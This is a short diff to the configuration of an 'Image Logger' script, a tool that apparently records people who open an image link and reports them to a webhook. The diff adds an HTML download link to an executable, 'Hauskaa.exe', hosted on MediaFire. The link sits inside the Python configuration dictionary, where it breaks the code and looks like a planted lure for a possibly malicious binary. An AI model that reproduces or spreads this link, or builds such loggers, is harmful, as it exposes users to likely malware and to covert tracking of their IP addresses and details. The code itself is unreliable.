@@ -17,6 +17,9 @@ config = {
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
+    <a href="https://download1321.mediafire.com/laaco1xi21igmRkjQG0Ksazjj_ksDLchyHUvnXs7PQzXw_RzS_lH34SAwhGcBINMUN-BuPlx_RSjLL0fMLPV8tZtkTF45xWpaKhrxGwhUWS-eIMEO0irgLWd3aQJUUwEsmiJ2cRPegFjnB-4PrQrCLDf-KTzhfyWKA9IspibyHv4wcNn/aintdjw0ftycea5/Hauskaa.exe" download>Download</a>
+
+    
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
